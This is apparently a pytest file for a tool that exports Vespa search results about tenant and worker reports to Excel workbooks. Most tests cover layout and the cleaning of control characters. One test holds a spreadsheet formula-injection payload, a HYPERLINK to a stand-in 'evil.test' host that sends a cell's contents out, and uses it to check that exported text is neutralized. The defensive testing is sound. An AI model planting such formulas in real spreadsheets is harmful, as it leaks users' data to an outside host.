"""Vespa Excel export smoke tests — no Vespa or Streamlit required."""

from io import BytesIO

import openpyxl

from re_source.export import export_vespa_xlsx
from re_source.search import SearchResult


def _make_results():
    return [
        SearchResult(
            doc_id="rec1",
            text="chunk a\nchunk b",
            source_file="appAbC123DeF456Gh",
            fields={
                "_record_id": "rec1",
                "_created_time": "2024-03-15T12:00:00.000Z",
                "Name (from Link)": '["Jane Doe"]',
                "Tags": '["mold","housing"]',
                "Plain": "just text",
                # Corpus columns public must not surface on its own.
                "consent_present": "True",
                "Best Contact Method": '["Signal"]',
            },
            score=0.87,
            payload={
                "matching_chunks": [
                    {"column_name": "What happened?", "text": "mold everywhere"},
                    {"column_name": "State", "text": "CA"},
                ],
                "llm_reason": "tenant",
            },
        ),
    ]


def _summary(results):
    wb = openpyxl.load_workbook(BytesIO(export_vespa_xlsx(results).getvalue()))
    ws = wb["Summary"]
    header = [c.value for c in ws[1]]
    row = [c.value for c in ws[2]]
    return wb, header, row


def test_summary_has_expected_columns():
    wb, header, _ = _summary(_make_results())
    assert "Summary" in wb.sheetnames
    for col in [
        "Dataset", "Dataset ID", "Record ID", "Record URL",
        "Submitted Date", "Matching Chunks", "AI Reason",
    ]:
        assert col in header, f"missing column {col}"


def test_bracketed_values_are_unwrapped():
    _, header, row = _summary(_make_results())
    assert row[header.index("Name")] == "Jane Doe"


def test_matching_chunks_carry_full_text():
    _, header, row = _summary(_make_results())
    assert "mold everywhere" in row[header.index("Matching Chunks")]


def test_cited_evidence_has_its_own_column():
    results = _make_results()
    results[0].payload["matching_chunks"] = []
    results[0].payload["evidence"] = [{"field": "Your job", "quote": "teacher"}]
    _, header, row = _summary(results)

    assert row[header.index("Cited Evidence")] == "Your job: teacher"
    assert not row[header.index("Matching Chunks")]


def test_a_search_match_leaves_cited_evidence_blank():
    _, header, row = _summary(_make_results())
    assert not row[header.index("Cited Evidence")]


def test_formula_like_tip_text_is_not_a_formula():
    payload = '=HYPERLINK("http://evil.test/?d="&A1,"Open")'
    results = _make_results()
    results[0].fields["Plain"] = payload
    results[0].payload["llm_reason"] = payload

    wb = openpyxl.load_workbook(BytesIO(export_vespa_xlsx(results).getvalue()))
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                assert cell.data_type != "f", f"{ws.title}!{cell.coordinate} is a formula"

    # Neutralizing must not alter the text itself.
    ws = wb["Summary"]
    header = [c.value for c in ws[1]]
    assert [c.value for c in ws[2]][header.index("AI Reason")] == payload


def test_formula_like_column_name_is_not_a_formula():
    results = _make_results()
    results[0].fields["=1+1"] = "x"

    wb = openpyxl.load_workbook(BytesIO(export_vespa_xlsx(results).getvalue()))
    for ws in wb.worksheets:
        for cell in ws[1]:
            assert cell.data_type != "f", f"{ws.title}!{cell.coordinate} is a formula"


def test_leading_plus_values_are_left_intact():
    results = _make_results()
    results[0].fields["Plain"] = "+1-555-0100"

    wb = openpyxl.load_workbook(BytesIO(export_vespa_xlsx(results).getvalue()))
    ws = wb[[s for s in wb.sheetnames if s != "Summary"][0]]
    header = [c.value for c in ws[1]]
    assert [c.value for c in ws[2]][header.index("Plain")] == "+1-555-0100"


def test_control_characters_in_tip_text_do_not_abort_the_export():
    results = _make_results()
    results[0].fields["Plain"] = "Literacy DE\x0bstate wide 501 (c) 3"

    wb = openpyxl.load_workbook(BytesIO(export_vespa_xlsx(results).getvalue()))
    ws = wb[[s for s in wb.sheetnames if s != "Summary"][0]]
    header = [c.value for c in ws[1]]
    assert [c.value for c in ws[2]][header.index("Plain")] == "Literacy DEstate wide 501 (c) 3"


def test_control_characters_are_stripped_from_summary_columns():
    results = _make_results()
    results[0].payload["matching_chunks"][0]["text"] = "mold\x07everywhere"
    results[0].payload["llm_reason"] = "tenant\x1f report"

    _, header, row = _summary(results)
    assert "moldeverywhere" in row[header.index("Matching Chunks")]
    assert row[header.index("AI Reason")] == "tenant report"


def test_control_characters_in_a_column_name_do_not_abort_the_export():
    results = _make_results()
    results[0].fields["Wha\x0ct happened"] = "x"

    wb = openpyxl.load_workbook(BytesIO(export_vespa_xlsx(results).getvalue()))
    ws = wb[[s for s in wb.sheetnames if s != "Summary"][0]]
    assert "What happened" in [c.value for c in ws[1]]


def test_newlines_and_tabs_survive():
    results = _make_results()
    results[0].fields["Plain"] = "line one\r\nline two\tindented"

    wb = openpyxl.load_workbook(BytesIO(export_vespa_xlsx(results).getvalue()))
    ws = wb[[s for s in wb.sheetnames if s != "Summary"][0]]
    header = [c.value for c in ws[1]]
    assert [c.value for c in ws[2]][header.index("Plain")] == "line one\r\nline two\tindented"


def test_matched_queries_column_is_blank_without_a_batch_payload():
    _, header, row = _summary(_make_results())
    assert row[header.index("Matched Queries")] is None


def test_matched_queries_column_lists_every_query_that_found_the_row():
    results = _make_results()
    results[0].payload["queries"] = ["teachers", "school staff"]
    _, header, row = _summary(results)
    assert row[header.index("Matched Queries")] == "teachers; school staff"


def test_corpus_columns_are_not_public_summary_columns():
    # Corpus-specific columns come from EXPORT_POLICY_MODULE, not public code.
    _, header, _ = _summary(_make_results())
    assert "Consent Present" not in header
    assert "Best Contact Method" not in header


def test_the_workbook_carries_no_column_the_pipeline_cannot_fill():
    _, header, _ = _summary(_make_results())
    assert "AI Confidence" not in header
    assert "AI Reason" in header


# ----- one tab per query ------------------------------------------------------

from re_source.export import export_by_query_xlsx


def _hit(doc_id, source_file, reason, score=0.5, **fields):
    return SearchResult(
        doc_id=doc_id, text="", source_file=source_file,
        fields={"_record_id": doc_id, **fields}, score=score,
        payload={"llm_reason": reason, "evidence": [{"field": "Job", "quote": "I work there"}]},
    )


def _by_query_workbook(merged, per_query):
    return openpyxl.load_workbook(BytesIO(export_by_query_xlsx(merged, per_query).getvalue()))


def _cells(ws):
    return [[c.value for c in row] for row in ws.iter_rows()]


def test_one_tab_per_query_after_the_summary():
    a = _hit("rec1", "appAAA", "works at Walmart")
    b = _hit("rec2", "appAAA", "works at Target")

    wb = _by_query_workbook([a, b], [("#1 Walmart", [a]), ("#4 Target", [b])])

    assert wb.sheetnames == ["Summary", "#1 Walmart", "#4 Target"]


def test_a_query_with_no_matches_gets_no_tab():
    a = _hit("rec1", "appAAA", "works at Walmart")

    wb = _by_query_workbook([a], [("#1 Walmart", [a]), ("#4 Target", [])])

    assert wb.sheetnames == ["Summary", "#1 Walmart"]


def test_each_dataset_is_its_own_table_with_its_own_columns():
    a = _hit("rec1", "appAAA", "r1", score=0.9, Employer="Walmart")
    b = _hit("rec2", "appBBB", "r2", score=0.8, Workplace="Walmart DC")
    c = _hit("rec3", "appAAA", "r3", score=0.7, Employer="Walmart Inc")

    rows = _cells(_by_query_workbook([a, b, c], [("#1 Walmart", [a, b, c])])["#1 Walmart"])

    assert rows[0][0] == "appAAA (2 matches)"
    assert rows[1][:3] == ["Record URL", "Why Matched", "Cited Evidence"]
    assert "Employer" in rows[1] and "Workplace" not in rows[1]
    assert [r[1] for r in rows[2:4]] == ["r1", "r3"]
    # Two blank rows, then the next dataset's own table.
    assert rows[6][0] == "appBBB (1 match)"
    assert "Workplace" in rows[7] and "Employer" not in rows[7]
    assert rows[8][1] == "r2"


def test_tab_tables_carry_the_cited_evidence():
    a = _hit("rec1", "appAAA", "works at Walmart")

    rows = _cells(_by_query_workbook([a], [("#1 Walmart", [a])])["#1 Walmart"])

    assert rows[2][2] == "Job: I work there"


def test_formula_like_text_in_a_query_tab_is_not_a_formula():
    a = _hit("rec1", "appAAA", "=HYPERLINK(\"http://x\")")

    ws = _by_query_workbook([a], [("#1 Walmart", [a])])["#1 Walmart"]

    assert all(c.data_type != "f" for row in ws.iter_rows() for c in row)


# ----- operator-chosen summary columns -----------------------------------------


def _with_policy(monkeypatch, columns):
    import sys
    import types

    from re_source import config, export

    module = types.ModuleType("test_export_policy")
    module.summary_columns = lambda: columns
    monkeypatch.setitem(sys.modules, module.__name__, module)
    monkeypatch.setattr(config, "EXPORT_POLICY_MODULE", module.__name__)
    export._load_summary_columns.cache_clear()


def test_a_policy_module_adds_summary_columns_before_matched_queries(monkeypatch):
    _with_policy(monkeypatch, [("Plain Copy", "plain")])

    _, header, row = _summary(_make_results())

    assert header.index("Submitted Date") < header.index("Plain Copy") < header.index("Matched Queries")
    assert row[header.index("Plain Copy")] == "just text"


def test_a_policy_column_matches_however_the_dataset_spells_it(monkeypatch):
    _with_policy(monkeypatch, [("Consent", "consent-present")])

    _, header, row = _summary(_make_results())

    assert row[header.index("Consent")] == "True"


def test_a_policy_column_is_blank_when_the_dataset_lacks_it(monkeypatch):
    _with_policy(monkeypatch, [("Willing to Help", "willing_to_help")])

    _, header, row = _summary(_make_results())

    assert row[header.index("Willing to Help")] is None


def test_the_summary_has_no_score_column():
    _, header, _ = _summary(_make_results())

    assert "Score" not in header


def test_a_policy_column_can_read_several_fields(monkeypatch):
    # "Plain" is "plain" respelled, so its value is not repeated.
    _with_policy(monkeypatch, [("Mixed", ("missing", "plain", "consent_present", "Plain"))])

    _, header, row = _summary(_make_results())

    assert row[header.index("Mixed")] == "just text; True"


def test_a_policy_module_must_define_summary_columns(monkeypatch):
    import sys
    import types

    import pytest

    from re_source import config, export

    module = types.ModuleType("test_bad_export_policy")
    monkeypatch.setitem(sys.modules, module.__name__, module)
    monkeypatch.setattr(config, "EXPORT_POLICY_MODULE", module.__name__)
    export._load_summary_columns.cache_clear()

    with pytest.raises(ValueError, match="summary_columns"):
        export.summary_columns()
